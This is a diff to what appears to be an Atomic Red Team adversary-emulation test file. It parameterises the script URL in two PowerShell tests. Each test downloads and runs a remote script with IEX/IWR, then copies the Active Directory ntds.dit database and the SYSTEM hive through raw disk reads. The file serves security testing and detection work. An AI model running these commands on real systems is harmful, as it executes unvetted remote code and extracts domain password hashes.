@@ -273,10 +273,14 @@ atomic_tests:
       type: string
       default: C:\Windows\Temp
       description: Path for extracted NTDS.dit
+    script_url:
+      description: URL to UnderlayCopy script
+      type: url
+      default: https://raw.githubusercontent.com/kfallahi/UnderlayCopy/refs/heads/main/UnderlayCopy.ps1
   executor:
     command: |
       [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-      IEX (IWR 'https://raw.githubusercontent.com/kfallahi/UnderlayCopy/refs/heads/main/UnderlayCopy.ps1' -UseBasicParsing)
+      IEX (IWR #{script_url} -UseBasicParsing)
       Underlay-Copy -Mode MFT -SourceFile C:\Windows\NTDS\ntds.dit -DestinationFile #{extract_path}\ntds.dit
       Underlay-Copy -Mode MFT -SourceFile C:\Windows\System32\config\SYSTEM -DestinationFile #{extract_path}\SYSTEM_HIVE
     name: powershell
@@ -297,10 +301,14 @@ atomic_tests:
       type: string
       default: C:\Windows\Temp
       description: Path for extracted NTDS.dit
+    script_url:
+      description: URL to UnderlayCopy script
+      type: url
+      default: https://raw.githubusercontent.com/kfallahi/UnderlayCopy/refs/heads/main/UnderlayCopy.ps1
   executor:
     command: |
       [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-      IEX (IWR 'https://raw.githubusercontent.com/kfallahi/UnderlayCopy/refs/heads/main/UnderlayCopy.ps1' -UseBasicParsing)
+      IEX (IWR #{script_url} -UseBasicParsing)
       Underlay-Copy -Mode Metadata -SourceFile C:\Windows\NTDS\ntds.dit -DestinationFile #{extract_path}\ntds.dit
       Underlay-Copy -Mode Metadata -SourceFile C:\Windows\System32\config\SYSTEM -DestinationFile #{extract_path}\SYSTEM_HIVE
     name: powershell
